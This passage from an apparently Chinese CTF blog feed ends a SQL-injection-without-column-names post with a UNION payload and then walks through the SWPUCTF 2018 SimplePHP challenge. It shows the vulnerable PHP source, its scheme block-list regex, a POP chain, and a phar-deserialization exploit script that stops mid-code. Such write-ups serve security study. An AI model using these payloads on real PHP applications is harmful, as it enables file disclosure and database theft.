<pre class=" language-php"><code class="language-php">select <span class="token function">concat</span><span class="token punctuation">(</span>`<span class="token number">2</span>`<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>`<span class="token number">3</span>`<span class="token punctuation">)</span> <span class="token function">from</span> <span class="token punctuation">(</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> union select <span class="token operator">*</span> from users<span class="token punctuation">)</span>a limit <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span></code></pre>
<p><img src="https://upload-images.jianshu.io/upload_images/16739626-f62f28bafcd3774e.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p>
<p>FROM:<a href="https://links.jianshu.com/go?to=https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/">Extracting data without knowing columns names </a></p>
<p>参考：<a href="https://www.jianshu.com/p/6eba3370cfab">https://www.jianshu.com/p/6eba3370cfab</a></p>
]]></content>
      <tags>
        <tag>无列名注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPUCTF：2018-SimplePHP</title>
    <url>/2021/08/06/swpuctf-2018-simplephp/</url>
    <content><![CDATA[<p>file.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token keyword">include</span> <span class="token string">'function.php'</span><span class="token punctuation">;</span> 
<span class="token keyword">include</span> <span class="token string">'class.php'</span><span class="token punctuation">;</span> 
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">echo</span> <span class="token string">"&lt;h2>There is no file to show!&lt;h2/>"</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> 
<span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span> 
    <span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'file doesn\'t exists.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> 
<span class="token delimiter">?></span> </code></pre>
<p>function.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
<span class="token comment" spellcheck="true">//show_source(__FILE__); </span>
<span class="token keyword">include</span> <span class="token string">"base.php"</span><span class="token punctuation">;</span> 
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">function</span> <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span> 
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".jpg"</span><span class="token punctuation">;</span> 
    <span class="token comment" spellcheck="true">//mkdir("upload",0777); </span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span> 
    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">echo</span> <span class="token string">'&lt;script type="text/javascript">alert("上传成功!");&lt;/script>'</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> 
<span class="token keyword">function</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span> 
<span class="token punctuation">}</span> 
<span class="token keyword">function</span> <span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span> 
    <span class="token variable">$allowed_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"gif"</span><span class="token punctuation">,</span><span class="token string">"jpeg"</span><span class="token punctuation">,</span><span class="token string">"jpg"</span><span class="token punctuation">,</span><span class="token string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token comment" spellcheck="true">//echo "&lt;h4>请选择上传的文件:" . "&lt;h4/>"; </span>
    <span class="token punctuation">}</span> 
    <span class="token keyword">else</span><span class="token punctuation">{</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allowed_types</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span> 
        <span class="token keyword">else</span> <span class="token punctuation">{</span> 
            <span class="token keyword">echo</span> <span class="token string">'&lt;script type="text/javascript">alert("Invalid file!");&lt;/script>'</span><span class="token punctuation">;</span> 
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span> 
    <span class="token punctuation">}</span> 
<span class="token punctuation">}</span> 
<span class="token delimiter">?></span> </code></pre>
<p>class.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">C1e4r</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Show</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>       <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//$this->source = phar://phar.jpg</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"hacker~"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">Test</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>base.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter">?></span> 
<span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span> 
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span> 
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span> 
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> 
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>web3<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span> 
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> 
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span> 
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span> 
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span> 
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span> 
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar navbar-default<span class="token punctuation">"</span></span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navigation<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> 
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container-fluid<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> 
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar-header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> 
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar-brand<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>首页<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span> 
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span> 
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>nav navbar-nav navbra-toggle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> 
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>active<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file.php?file<span class="token punctuation">=</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>查看文件<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span> 
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>upload_file.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>上传文件<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span> 
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span> 
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>nav navbar-nav navbar-right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> 
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>glyphicon glyphicon-user<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span> 
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span> 
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span> 
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span></span> 
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span> 
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span> 
<span class="token markup"><span class="token comment" spellcheck="true">&lt;!--flag is in f1ag.php--></span></span></code></pre>
<h5 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h5><h5 id="C1e4r-destruct-–-gt-Show-toString-–-gt-Test-get-。"><a href="#C1e4r-destruct-–-gt-Show-toString-–-gt-Test-get-。" class="headerlink" title="C1e4r::destruct()  –>  Show::toString()   –>  Test::__get() 。"></a>C1e4r::destruct()  –&gt;  Show::toString()   –&gt;  Test::__get() 。</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">C1e4r</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Show</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">Test</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token variable">$c1e4r</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$test</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/var/www/html/f1ag.php"</span><span class="token punctuation">;</span>
<span class="token variable">$c1e4r</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$show</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//利用  $this->test = $this->str; echo $this->test;</span>
<span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$test</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//利用 $this->str['str']->source;</span>


<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"exp.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'&lt;?php __HALT_COMPILER(); ? >'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$c1e4r</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"exp.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
